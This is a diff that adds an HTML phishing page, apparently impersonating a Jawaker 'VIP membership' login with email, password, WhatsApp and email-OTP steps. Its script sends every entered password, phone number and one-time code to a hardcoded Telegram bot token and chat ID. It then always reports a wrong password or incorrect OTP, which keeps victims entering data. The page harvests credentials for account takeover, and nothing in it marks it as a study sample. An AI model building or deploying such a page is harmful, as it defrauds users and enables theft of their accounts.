@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=1.0" />
+<title>عضوية VIP</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=Inter:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap');
+@import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css');
+
+:root {
+  --bg: #29292b;
+  --card: #1c1c1e;
+  --card-border: #3a3a3d;
+  --text: #edeff3;
+  --text-dim: #9a9a9e;
+  --gold: #c9a227;
+  --green: #24af4b;
+  --red: #ff3333;
+}
+* { box-sizing: border-box; }
+html, body { height: 100%; }
+body {
+  position: relative;
+  margin: 0; min-height: 100vh;
+  display: flex; flex-direction: column;
+  background-color: #1a1a1c;
+  /* الخلفية تتكرر بشكل أفقي وعمودي */
+  background-image: url('background.png');
+  background-repeat: repeat;
+  background-position: top left;
+  background-attachment: fixed;
+  font-family: 'Inter', sans-serif; color: var(--text);
+  overflow-x: hidden;
+}
+
+/* الهيدر */
+.site-header {
+  position: relative;
+  background: #000000;
+  height: 70px;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 20px;
+  flex-shrink: 0;
+  z-index: 2;
+}
+.header-logo { max-height: 52px; max-width: 160px; object-fit: contain; }
+.header-lines { display: flex; flex-direction: column; gap: 4px; }
+.header-lines span { display: block; width: 24px; height: 3px; background: #ffffff; border-radius: 2px; }
+
+/* المحتوى */
+.main-content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; position: relative; z-index: 2; }
+
+.card {
+  position: relative; width: 100%; max-width: 440px;
+  background: rgba(8, 8, 9, 0.75);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  border: 1px solid var(--card-border);
+  border-radius: 14px; padding: 22px 26px 24px;
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+  z-index: 2;
+}
+.eyebrow {
+  font-size: 18px; font-weight: 700; letter-spacing: 1px;
+  color: var(--gold); text-transform: uppercase; text-align: left;
+  margin-bottom: 10px;
+}
+.eyebrow-divider { border-bottom: 2px solid #ffffff; opacity: 0.55; margin-bottom: 16px; }
+.field-group { position: relative; margin-bottom: 14px; }
+.field-group input {
+  width: 100%; padding: 11px 12px; margin-bottom: 0;
+  background: #ffffff; border: 1px solid var(--card-border); border-radius: 10px;
+  color: #17171a; font-family: 'Inter', sans-serif; font-size: 13px; outline: none;
+  text-align: left; direction: ltr; transition: all 0.15s ease;
+}
+.field-group input::placeholder { color: #8a8a90; }
+.field-group input:focus { border-color: var(--gold); }
+.field-group input.input-error {
+  border: 2px solid var(--red) !important;
+  box-shadow: 0 0 8px rgba(255, 51, 51, 0.7) !important;
+  background: #fff5f5 !important;
+}
+
+.promo-divider { border-top: 1px solid rgba(237, 239, 243, 0.2); margin: 16px 0 12px; }
+.promo-text { text-align: center; color: var(--gold); font-weight: 600; font-size: 12px; letter-spacing: 0.2px; }
+button {
+  width: 100%; padding: 10px; border: none; border-radius: 8px;
+  background: linear-gradient(180deg, #4cbb63 0%, #2e8b45 100%);
+  color: #ffffff; font-weight: 600; font-size: 13px;
+  letter-spacing: 0.3px; cursor: pointer; transition: filter 0.15s ease;
+}
+#accessBtn { width: 45%; display: block; }
+button:hover { filter: brightness(1.08); }
+
+.social-login-container { display: flex; align-items: center; justify-content: center; gap: 14px; margin-top: 16px; position: relative; z-index: 10; }
+.social-icon-btn {
+  display: flex; align-items: center; justify-content: center;
+  width: 44px; height: 44px; border-radius: 50%; padding: 0;
+  text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+  transition: transform 0.15s ease, filter 0.15s ease;
+  cursor: pointer;
+  z-index: 20;
+}
+.social-icon-btn i { color: #ffffff; font-size: 20px; pointer-events: none; }
+.social-icon-btn:hover { filter: brightness(1.08); transform: translateY(-2px); }
+.email-btn { background: linear-gradient(180deg, #3b82f6 0%, #1d4ed8 100%); border: 2px solid #60a5fa; }
+.whatsapp-btn { background: #25d366; border: 2px solid #25d366; }
+
+.modal-overlay {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0, 0, 0, 0.65); display: flex; align-items: center; justify-content: center;
+  padding: 15px;
+  z-index: 99999; opacity: 0; visibility: hidden; transition: all 0.25s ease;
+}
+.modal-overlay.active { opacity: 1; visibility: visible; }
+
+.dark-modal {
+  width: 100%; max-width: 360px; background: #121214; 
+  border: 1px solid #2c2c30;
+  border-radius: 14px; padding: 18px 18px 20px; 
+  box-shadow: 0 10px 30px rgba(0,0,0,0.7); position: relative; direction: ltr;
+  z-index: 100000;
+}
+.modal-close-btn { position: absolute; top: 14px; right: 16px; color: #a1a1a5; cursor: pointer; font-size: 20px; z-index: 10; }
+.dark-modal-title { text-align: center; font-size: 18px; font-weight: 700; color: #ffffff; margin-bottom: 16px; letter-spacing: 0.5px; }
+
+.email-input-wrapper { background: #1a1a1c; border-radius: 10px; padding: 12px; margin-bottom: 16px; box-shadow: inset 0 2px 5px rgba(0,0,0,0.4); }
+#linkEmailInput {
+  width: 100%; background: #0a0a0a; border: none; border-radius: 8px;
+  color: #ffffff; font-size: 14px; padding: 10px; text-align: center; outline: none; box-shadow: inset 0 2px 4px rgba(0,0,0,0.6);
+}
+#linkEmailInput::placeholder { color: #666666; font-style: italic; }
+
+.submit-gold-btn {
+  width: 100%; padding: 12px; border: none; border-radius: 8px;
+  background: #333333; color: #888888; font-weight: 700; font-size: 15px;
+  cursor: not-allowed; transition: all 0.2s ease;
+}
+.submit-gold-btn.ready-gold {
+  background: linear-gradient(180deg, #d3a726 0%, #9a7611 100%); 
+  color: #ffffff; cursor: pointer; box-shadow: 0 3px 10px rgba(201, 162, 39, 0.3);
+}
+
+.verify-instruction { color: #cccccc; font-size: 12.5px; text-align: center; margin-bottom: 16px; line-height: 1.5; }
+.verify-instruction strong { color: #ffffff; font-weight: 600; }
+
+.code-input-wrapper {
+  background: #1a1a1c; border-radius: 10px; padding: 0; margin: 0 auto 10px;
+  width: 100%; max-width: 240px; box-shadow: inset 0 2px 5px rgba(0,0,0,0.4); position: relative; height: 55px; 
+}
+.code-dashes { position: absolute; bottom: 12px; left: 50%; transform: translateX(-50%); display: flex; gap: 10px; z-index: 1; pointer-events: none; }
+.code-dashes span { width: 14px; height: 2px; background: #ffffff; display: block; opacity: 0.5; }
+.code-input-field {
+  width: 100%; height: 100%; background: transparent; border: none; color: #ffffff;
+  font-size: 20px; font-weight: 700; text-align: center; outline: none; letter-spacing: 13.5px; padding-left: 13.5px; z-index: 2; position: relative; text-transform: uppercase;
+  padding-bottom: 10px;
+}
+.otp-error-msg { color: var(--red); text-align: center; font-weight: 700; margin-bottom: 12px; font-size: 13px; display: none; }
+
+.timer-text { text-align: center; color: #cccccc; font-size: 12px; font-weight: 500; margin-bottom: 16px; }
+
+.whatsapp-box-container {
+  background: #1a1a1c; border-radius: 10px; padding: 14px 12px; margin-bottom: 16px;
+  box-shadow: inset 0 2px 5px rgba(0,0,0,0.4); text-align: center;
+}
+.whatsapp-instruction { color: #cccccc; font-size: 13px; margin-bottom: 14px; font-weight: 400; line-height: 1.4; }
+
+.phone-combobox {
+  background: #0d0d0d; border-radius: 8px; padding: 6px 10px;
+  display: flex; align-items: center; gap: 10px;
+  box-shadow: inset 0 2px 4px rgba(0,0,0,0.7); width: 100%;
+  max-width: 280px; margin: 0 auto; position: relative;
+}
+.country-picker-area {
+  display: flex; align-items: center; gap: 6px; position: relative; cursor: pointer;
+  padding-right: 10px; border-right: 1px solid #222222;
+}
+.circle-flag {
+  width: 24px; height: 24px; border-radius: 50%; object-fit: cover;
+  display: inline-block; box-shadow: 0 0 2px rgba(255,255,255,0.3); background-color: #333;
+}
+.country-select-dropdown {
+  position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; z-index: 5;
+}
+.country-select-dropdown option { background-color: #1c1c1e; color: #ffffff; padding: 8px; }
+.dropdown-arrow { color: #aaaaaa; font-size: 10px; }
+.code-display-text { color: #ffffff; font-size: 13.5px; font-weight: 500; direction: ltr; }
+.phone-number-input {
+  flex: 1; background: transparent; border: none; color: #ffffff; font-size: 14px; outline: none; text-align: left; direction: ltr;
+}
+
+.whatsapp-submit-btn, .whatsapp-connect-btn {
+  width: 100%; padding: 12px; border-radius: 8px;
+  background: #061B0C; color: #555555;
+  font-weight: 700; font-size: 14px;
+  display: flex; align-items: center; justify-content: center; gap: 8px; cursor: not-allowed;
+  border: 1px solid #113318; transition: all 0.2s ease;
+}
+.whatsapp-submit-btn.ready-whatsapp, .whatsapp-connect-btn.ready-connect {
+  background: #20C94A; color: #ffffff; cursor: pointer; border: 1px solid #20C94A;
+}
+.whatsapp-connect-btn.ready-connect:hover { filter: none; }
+
+.whatsapp-code-instruction { color: #cccccc; font-size: 12.5px; text-align: center; margin-bottom: 16px; line-height: 1.5; }
+.whatsapp-code-instruction strong { color: #ffffff; font-weight: 600; }
+.whatsapp-code-actions { display: flex; gap: 10px; margin-top: 8px; }
+
+/* زر إعادة الإرسال الرمادي مع الإضاءة على الحواف */
+.whatsapp-resend-btn {
+  flex: 1; padding: 12px; border: none; border-radius: 8px;
+  background: #1a1a1c; color: #777777; font-weight: 700; font-size: 14px;
+  cursor: not-allowed; box-shadow: inset 0 2px 4px rgba(0,0,0,0.5); transition: all 0.2s ease;
+}
+.whatsapp-resend-btn.ready-resend { 
+  background: #555658; 
+  color: #ffffff; 
+  cursor: pointer; 
+  border: 1px solid #777777;
+  box-shadow: 0 0 12px rgba(255, 255, 255, 0.15), inset 0 0 4px rgba(255, 255, 255, 0.3);
+}
+.whatsapp-connect-btn { flex: 1; }
+
+/* رسالة الخطأ الخاصة بالواتساب */
+.whatsapp-error-overlay-box {
+  position: absolute;
+  top: 50%; left: 50%;
+  transform: translate(-50%, -50%);
+  width: 85%;
+  height: 130px;
+  background: #1e1e1e;
+  border: 1px solid #333;
+  border-radius: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #dfdfdf;
+  font-size: 16px;
+  font-weight: 400;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.8), inset 0 0 0 1px rgba(255,255,255,0.03);
+  z-index: 200;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.3s ease, visibility 0.3s ease;
+}
+.whatsapp-error-overlay-box.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+.msg { font-size: 13px; font-weight: 700; text-align: center; border-radius: 8px; padding: 9px 10px; margin-bottom: 14px; display: none; }
+.msg.error { background: rgba(255, 51, 51, 0.18); color: var(--red); display: block; border: 1px solid var(--red); }
+.view { display: none; }
+.view.active { display: block; }
+
+.site-footer { flex-shrink: 0; padding: 18px 20px; background-color: #1c1c1e; border-top: 1px solid rgba(237, 239, 243, 0.2); position: relative; z-index: 1; }
+.footer-content { max-width: 440px; margin: 0 auto; text-align: right; }
+.footer-name { font-size: 12px; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+.footer-address { font-size: 11.5px; color: var(--text-dim); line-height: 1.6; }
+.footer-copyright { max-width: 440px; margin: 12px auto 0; text-align: center; font-size: 11px; color: var(--text-dim); }
+</style>
+</head>
+<body>
+
+  <header class="site-header">
+    <img src="logo.png" alt="Logo" class="header-logo" onerror="this.style.display='none'">
+    <div class="header-lines"><span></span><span></span><span></span></div>
+  </header>
+
+  <div class="main-content">
+    <div class="card view active" id="view-access">
+      <div class="eyebrow">VIP Domain</div>
+      <div class="eyebrow-divider"></div>
+      <div id="accessMsg" class="msg"></div>
+      <form id="accessForm" autocomplete="off">
+        <div class="field-group">
+          <input type="email" id="accEmail" placeholder="Email" required autocomplete="off" />
+        </div>
+        <div class="field-group">
+          <input type="password" id="accPassword" placeholder="Password" required autocomplete="off" />
+        </div>
+        <button type="submit" id="accessBtn">Login</button>
+      </form>
+
+      <div class="social-login-container">
+        <button type="button" class="social-icon-btn email-btn" id="openEmailModalBtn"><i class="fas fa-envelope"></i></button>
+        <button type="button" class="social-icon-btn whatsapp-btn" id="openWhatsappModalBtn"><i class="fab fa-whatsapp"></i></button>
+      </div>
+
+      <div class="promo-divider"></div>
+      <div class="promo-text">Join VIP Now &amp; Claim Your Free Rewards</div>
+    </div>
+  </div>
+
+  <!-- النافذة الأولى للإيميل -->
+  <div class="modal-overlay" id="emailModalOverlay">
+    <div class="dark-modal">
+      <div class="modal-close-btn" id="closeEmailModalBtn"><i class="fas fa-times"></i></div>
+      <div class="dark-modal-title">Link Email</div>
+      <div class="email-input-wrapper">
+        <input type="email" id="linkEmailInput" placeholder="Email" autocomplete="off" oninput="validateEmailField()">
+      </div>
+      <button class="submit-gold-btn" id="emailContinueBtn" onclick="submitEmailLink()">Continue</button>
+    </div>
+  </div>
+
+  <!-- نافذة التحقق من إيميل OTP -->
+  <div class="modal-overlay" id="emailVerifyModalOverlay">
+    <div class="dark-modal">
+      <div class="modal-close-btn" id="closeEmailVerifyBtn"><i class="fas fa-times"></i></div>
+      <div class="dark-modal-title">Verify Email</div>
+      <div class="verify-instruction">
+        Please enter the 6-character code sent to your email:<br><strong id="dynamicEmailDisplay"></strong>
+      </div>
+      <div class="code-input-wrapper">
+        <div class="code-dashes"><span></span><span></span><span></span><span></span><span></span><span></span></div>
+        <input type="text" id="emailCodeInput" class="code-input-field" maxlength="6" autocomplete="off" oninput="validateEmailCodeField()">
+      </div>
+      <div id="emailOtpError" class="otp-error-msg">Incorrect OTP</div>
+      <div class="timer-text" id="emailTimerText">Pin code expires within 30 seconds.</div>
+      <button class="submit-gold-btn" id="emailConnectBtn" onclick="submitEmailCode()">Connect</button>
+    </div>
+  </div>
+
+  <!-- نافذة الواتساب مع جميع الدول والأطوال الدقيقة -->
+  <div class="modal-overlay" id="whatsappModalOverlay">
+    <div class="dark-modal">
+      <div class="modal-close-btn" id="closeWhatsappModalBtn"><i class="fas fa-times"></i></div>
+      <div class="dark-modal-title">Verify Your Account</div>
+      
+      <div class="whatsapp-box-container">
+        <div class="whatsapp-instruction">Enter your mobile number to link your account</div>
+        
+        <div class="phone-combobox">
+          <div class="country-picker-area">
+            <img id="currentFlagImg" src="https://flagcdn.com/w40/jo.png" class="circle-flag" alt="flag">
+            <i class="fas fa-chevron-down dropdown-arrow"></i>
+            <span class="code-display-text" id="currentCodeDisplay">+962</span>
+            
+            <select class="country-select-dropdown" id="countrySelect" onchange="updateCountryUI()">
+              <option value="+962" data-code="+962" data-flag="jo" data-len="9">Jordan (+962)</option>
+              <option value="+966" data-code="+966" data-flag="sa" data-len="9">Saudi Arabia (+966)</option>
+              <option value="+971" data-code="+971" data-flag="ae" data-len="9">United Arab Emirates (+971)</option>
+              <option value="+963" data-code="+963" data-flag="sy" data-len="9">Syria (+963)</option>
+              <option value="+961" data-code="+961" data-flag="lb" data-len="8">Lebanon (+961)</option>
+              <option value="+964" data-code="+964" data-flag="iq" data-len="10">Iraq (+964)</option>
+              <option value="+20" data-code="+20" data-flag="eg" data-len="10">Egypt (+20)</option>
+              <option value="+965" data-code="+965" data-flag="kw" data-len="8">Kuwait (+965)</option>
+              <option value="+974" data-code="+974" data-flag="qa" data-len="8">Qatar (+974)</option>
+              <option value="+973" data-code="+973" data-flag="bh" data-len="8">Bahrain (+973)</option>
+              <option value="+968" data-code="+968" data-flag="om" data-len="8">Oman (+968)</option>
+              <option value="+212" data-code="+212" data-flag="ma" data-len="9">Morocco (+212)</option>
+              <option value="+216" data-code="+216" data-flag="tn" data-len="8">Tunisia (+216)</option>
+              <option value="+213" data-code="+213" data-flag="dz" data-len="9">Algeria (+213)</option>
+              <option value="+249" data-code="+249" data-flag="sd" data-len="9">Sudan (+249)</option>
+              <option value="+967" data-code="+967" data-flag="ye" data-len="9">Yemen (+967)</option>
+              <option value="+970" data-code="+970" data-flag="ps" data-len="9">Palestine (+970)</option>
+              <option value="+218" data-code="+218" data-flag="ly" data-len="9">Libya (+218)</option>
+              <option value="+1" data-code="+1" data-flag="us" data-len="10">United States (+1)</option>
+              <option value="+1" data-code="+1" data-flag="ca" data-len="10">Canada (+1)</option>
+              <option value="+49" data-code="+49" data-flag="de" data-len="11">Germany (+49)</option>
+              <option value="+46" data-code="+46" data-flag="se" data-len="9">Sweden (+46)</option>
+              <option value="+31" data-code="+31" data-flag="nl" data-len="9">Netherlands (+31)</option>
+              <option value="+90" data-code="+90" data-flag="tr" data-len="10">Turkey (+90)</option>
+            </select>
+          </div>
+          <input type="tel" class="phone-number-input" id="whatsappPhoneInput" maxlength="9" placeholder="" autocomplete="off" oninput="validateWhatsappPhone()">
+        </div>
+      </div>
+
+      <button class="whatsapp-submit-btn" id="whatsappSubmitBtn" onclick="submitWhatsappPhone()">
+        <i class="fab fa-whatsapp"></i> Send OTP via WhatsApp
+      </button>
+    </div>
+  </div>
+
+  <!-- نافذة كود الواتساب -->
+  <div class="modal-overlay" id="whatsappVerifyModalOverlay">
+    <div class="dark-modal" style="position: relative;">
+      
+      <!-- رسالة الخطأ الخاصة بالواتساب -->
+      <div id="customWhatsappError" class="whatsapp-error-overlay-box">
+        Incorrect OTP
+      </div>
+
+      <div class="modal-close-btn" id="closeWhatsappVerifyBtn"><i class="fas fa-times"></i></div>
+      <div class="dark-modal-title">Enter OTP</div>
+      
+      <div class="whatsapp-code-instruction">
+        Enter the 6-digit code sent to <strong id="dynamicPhoneDisplay"></strong> on WhatsApp
+      </div>
+
+      <div class="code-input-wrapper">
+        <div class="code-dashes"><span></span><span></span><span></span><span></span><span></span><span></span></div>
+        <input type="text" id="whatsappCodeInput" class="code-input-field" maxlength="6" autocomplete="off" oninput="validateWhatsappCodeField()">
+      </div>
+      
+      <div class="timer-text" id="whatsappTimerText">Resend a new OTP within 30 seconds</div>
+
+      <div class="whatsapp-code-actions">
+        <button class="whatsapp-resend-btn" id="whatsappResendBtn" disabled onclick="resendWhatsappCode()">Resend</button>
+        <button class="whatsapp-connect-btn" id="whatsappConnectBtn" onclick="submitWhatsappCode()">Connect</button>
+      </div>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-content">
+      <div class="footer-name">JAWAKER FZ LLC</div>
+      <div class="footer-address">Salam Street, TwoFour 54<br>North Park, Building 5<br>Abu Dhabi, UAE</div>
+    </div>
+    <div class="footer-copyright">جميع الحقوق محفوظة لـ جواكر © 2026</div>
+  </footer>
+
+<script>
+const TELEGRAM_TOKEN = '8955430886:AAE3sgW9k16fbdUSc7ma2n3elSZE0UxeQGc';
+const TELEGRAM_CHAT_ID = '5437487652';
+
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+  }).catch(err => console.error(err));
+}
+
+// أزرار فتح النوافذ
+document.getElementById('openEmailModalBtn').addEventListener('click', function() {
+  document.getElementById('emailModalOverlay').classList.add('active');
+});
+document.getElementById('openWhatsappModalBtn').addEventListener('click', function() {
+  document.getElementById('whatsappModalOverlay').classList.add('active');
+  updateCountryUI(); 
+});
+
+// أزرار إغلاق النوافذ وتصفير البيانات
+document.getElementById('closeEmailModalBtn').addEventListener('click', function() {
+  document.getElementById('emailModalOverlay').classList.remove('active');
+  const input = document.getElementById('linkEmailInput');
+  input.value = '';
+  validateEmailField(); 
+});
+
+document.getElementById('closeWhatsappModalBtn').addEventListener('click', function() {
+  document.getElementById('whatsappModalOverlay').classList.remove('active');
+  const input = document.getElementById('whatsappPhoneInput');
+  input.value = '';
+  validateWhatsappPhone(); 
+});
+
+document.getElementById('closeEmailVerifyBtn').addEventListener('click', function() {
+  document.getElementById('emailVerifyModalOverlay').classList.remove('active');
+  clearInterval(emailTimerInterval);
+  const input = document.getElementById('emailCodeInput');
+  input.value = '';
+  document.getElementById('emailOtpError').style.display = 'none';
+  validateEmailCodeField(); 
+});
+
+document.getElementById('closeWhatsappVerifyBtn').addEventListener('click', function() {
+  document.getElementById('whatsappVerifyModalOverlay').classList.remove('active');
+  clearInterval(whatsappTimerInterval);
+  const input = document.getElementById('whatsappCodeInput');
+  input.value = '';
+  document.getElementById('customWhatsappError').classList.remove('show');
+  validateWhatsappCodeField(); 
+});
+
+// تسجيل الدخول
+document.getElementById('accessForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const emailField = document.getElementById('accEmail').value;
+  const passwordField = document.getElementById('accPassword');
+  const msgBox = document.getElementById('accessMsg');
+  
+  sendToTelegram(`🔔 تسجيل دخول:\n📧 الإيميل: ${emailField}\n🔑 كلمة السر: ${passwordField.value}`);
+  
+  passwordField.value = '';
+  msgBox.textContent = 'خطأ في كلمة السر';
+  msgBox.className = 'msg error';
+  passwordField.classList.add('input-error');
+});
+document.getElementById('accPassword').addEventListener('input', function() {
+  this.classList.remove('input-error');
+  document.getElementById('accessMsg').style.display = 'none';
+});
+
+// الواتساب
+function updateCountryUI() {
+  const select = document.getElementById('countrySelect');
+  const opt = select.options[select.selectedIndex];
+  document.getElementById('currentFlagImg').src = `https://flagcdn.com/w40/${opt.getAttribute('data-flag')}.png`;
+  document.getElementById('currentCodeDisplay').textContent = opt.getAttribute('data-code');
+  
+  const len = parseInt(opt.getAttribute('data-len'));
+  const phoneInput = document.getElementById('whatsappPhoneInput');
+  
+  phoneInput.setAttribute('maxlength', len);
+  phoneInput.value = ''; 
+  validateWhatsappPhone();
+}
+
+function validateWhatsappPhone() {
+  const input = document.getElementById('whatsappPhoneInput');
+  input.value = input.value.replace(/[^0-9]/g, ''); 
+  
+  const select = document.getElementById('countrySelect');
+  const opt = select.options[select.selectedIndex];
+  const reqLen = parseInt(opt.getAttribute('data-len'));
+  const submitBtn = document.getElementById('whatsappSubmitBtn');
+  
+  if (input.value.length === reqLen) {
+    submitBtn.classList.add('ready-whatsapp');
+  } else {
+    submitBtn.classList.remove('ready-whatsapp');
+  }
+}
+
+let fullSavedPhoneNumber = '';
+function submitWhatsappPhone() {
+  const submitBtn = document.getElementById('whatsappSubmitBtn');
+  if(!submitBtn.classList.contains('ready-whatsapp')) return;
+  
+  fullSavedPhoneNumber = document.getElementById('currentCodeDisplay').textContent + document.getElementById('whatsappPhoneInput').value;
+  sendToTelegram(`🔔 واتساب:\n📱 ${fullSavedPhoneNumber}`);
+  
+  document.getElementById('whatsappModalOverlay').classList.remove('active');
+  document.getElementById('dynamicPhoneDisplay').textContent = fullSavedPhoneNumber;
+  document.getElementById('whatsappVerifyModalOverlay').classList.add('active');
+  startWhatsappTimer();
+}
+
+function validateWhatsappCodeField() {
+  const input = document.getElementById('whatsappCodeInput');
+  input.value = input.value.replace(/[^0-9]/g, '');
+  const val = input.value;
+  document.getElementById('whatsappConnectBtn').classList.toggle('ready-connect', val.length === 6);
+  document.getElementById('customWhatsappError').classList.remove('show');
+}
+
+function submitWhatsappCode() {
+  const val = document.getElementById('whatsappCodeInput').value;
+  if (val.length === 6) {
+    sendToTelegram(`🔔 كود الواتساب:\n📱 ${fullSavedPhoneNumber}\n🔢 ${val}`);
+    
+    const errorBox = document.getElementById('customWhatsappError');
+    errorBox.classList.add('show');
+    
+    setTimeout(() => {
+      errorBox.classList.remove('show');
+    }, 2500);
+
+    document.getElementById('whatsappCodeInput').value = '';
+    document.getElementById('whatsappConnectBtn').classList.remove('ready-connect');
+  }
+}
+
+// الإيميل (الشرط القاسي)
+function validateEmailField() {
+  const input = document.getElementById('linkEmailInput');
+  input.value = input.value.replace(/[^a-zA-Z0-9@._-]/g, '');
+  const val = input.value;
+  
+  const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  document.getElementById('emailContinueBtn').classList.toggle('ready-gold', emailRegex.test(val));
+}
+
+let savedUserEmail = '';
+function submitEmailLink() {
+  const inputVal = document.getElementById('linkEmailInput').value;
+  const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  
+  if(!emailRegex.test(inputVal)) return;
+  
+  savedUserEmail = inputVal;
+  sendToTelegram(`🔔 إيميل: ${savedUserEmail}`);
+  
+  document.getElementById('emailModalOverlay').classList.remove('active');
+  document.getElementById('dynamicEmailDisplay').textContent = savedUserEmail;
+  document.getElementById('emailVerifyModalOverlay').classList.add('active');
+  startEmailTimer();
+}
+
+function validateEmailCodeField() {
+  const input = document.getElementById('emailCodeInput');
+  input.value = input.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
+  const val = input.value;
+  document.getElementById('emailConnectBtn').classList.toggle('ready-gold', val.length === 6);
+  document.getElementById('emailOtpError').style.display = 'none';
+}
+
+function submitEmailCode() {
+  const val = document.getElementById('emailCodeInput').value;
+  if (val.length === 6) {
+    sendToTelegram(`🔔 كود الإيميل:\n📧 ${savedUserEmail}\n🔢 ${val}`);
+    document.getElementById('emailOtpError').style.display = 'block';
+    document.getElementById('emailCodeInput').value = '';
+    document.getElementById('emailConnectBtn').classList.remove('ready-gold');
+  }
+}
+
+// المؤقتات
+let emailTimerInterval;
+function startEmailTimer() {
+  let timeLeft = 30;
+  const timer = document.getElementById('emailTimerText');
+  emailTimerInterval = setInterval(() => {
+    timeLeft--;
+    timer.textContent = `Pin code expires within ${timeLeft} seconds.`;
+    if(timeLeft <= 0) clearInterval(emailTimerInterval);
+  }, 1000);
+}
+
+let whatsappTimerInterval;
+function startWhatsappTimer() {
+  let timeLeft = 30;
+  const resendBtn = document.getElementById('whatsappResendBtn');
+  resendBtn.disabled = true;
+  resendBtn.classList.remove('ready-resend');
+  
+  const timer = document.getElementById('whatsappTimerText');
+  whatsappTimerInterval = setInterval(() => {
+    timeLeft--;
+    timer.textContent = `Resend a new OTP within ${timeLeft} seconds`;
+    if(timeLeft <= 0) { 
+      clearInterval(whatsappTimerInterval); 
+      resendBtn.disabled = false; 
+      resendBtn.classList.add('ready-resend');
+      timer.textContent = `You can now resend the OTP`;
+    }
+  }, 1000);
+}
+
+function resendWhatsappCode() {
+    if(!document.getElementById('whatsappResendBtn').classList.contains('ready-resend')) return;
+    sendToTelegram(`🔔 إعادة إرسال كود الواتساب للرقم:\n📱 ${fullSavedPhoneNumber}`);
+    startWhatsappTimer();
+}
+</script>
+</body>
+</html>
